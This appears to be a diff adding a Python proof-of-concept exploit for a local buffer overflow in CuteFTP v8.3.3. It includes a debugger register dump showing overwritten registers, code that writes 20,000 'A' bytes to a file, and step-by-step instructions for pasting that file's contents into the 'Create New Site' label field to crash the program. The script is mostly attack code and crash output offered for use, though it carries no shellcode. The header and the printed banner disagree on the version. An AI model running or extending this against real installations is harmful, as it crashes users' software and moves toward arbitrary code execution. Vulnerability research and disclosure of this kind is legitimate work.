@@ -1,0 +1,60 @@
+#!/usr/bin/env python
+
+#####################################################################################################
+#
+# CuteFTP v8.3.3 Home/Pro/Lite Create New Site Local Buffer Overflow PoC
+# Found By:	Dr_IDE
+# Download: 	http://www.cuteftp.com/downloads/
+# Tested On:	Windows 7 RC, XP might be more shell friendly
+# Notes: 	This PoC exploits the "Create New Site" mechanism. Any site type that you pick will work.
+# 		Because of differences in the internal process of each site type you may be able to get
+#		execution through one of these channels.
+#
+#####################################################################################################
+
+"""
+EAX 02120000
+ECX 0228BA90 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EDX 41414141
+EBX 00004141
+ESP 0018C160
+EBP 0018C230
+ESI 0228BA88
+EDI 41414141
+EIP 77843913 ntdll.77843913
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 0  CS 0023 32bit 0(FFFFFFFF)
+A 1  SS 002B 32bit 0(FFFFFFFF)
+Z 0  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010212 (NO,NB,NE,A,NS,PO,GE,G)
+ST0 empty -??? FFFF 000000FF 00FF00FF
+ST1 empty -??? FFFF 00000000 00008200
+ST2 empty -??? FFFF 00010000 00010000
+ST3 empty 431.99999034404754640
+ST4 empty 1.0000000000000000000
+ST5 empty 1.0000000000000000000
+ST6 empty 16.000000000000000000
+ST7 empty 16.000000000000000000
+               3 2 1 0      E S P U O Z D I
+FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+"""
+
+buff = ("\x41" * 20000)
+
+try:
+	f1 = open("CuteFTP.txt","w");
+	f1.write(buff);
+	f1.close();
+
+	print "\nCuteFTP v8.3.2 Home/Pro/Lite Create New Site Local Buffer Overflow PoC"
+	print "By: Dr_IDE"
+	print "\nFile Created Successfully.\n"
+	print "Usage:\n [-] Click File\n [-] Create New FTP Site\n [-] Paste String into Label Field\n [-] Enter anything for Address\n [-] Click Connect\n [-] Boom."
+except:
+	print "[-] Error. File couldn't be created."
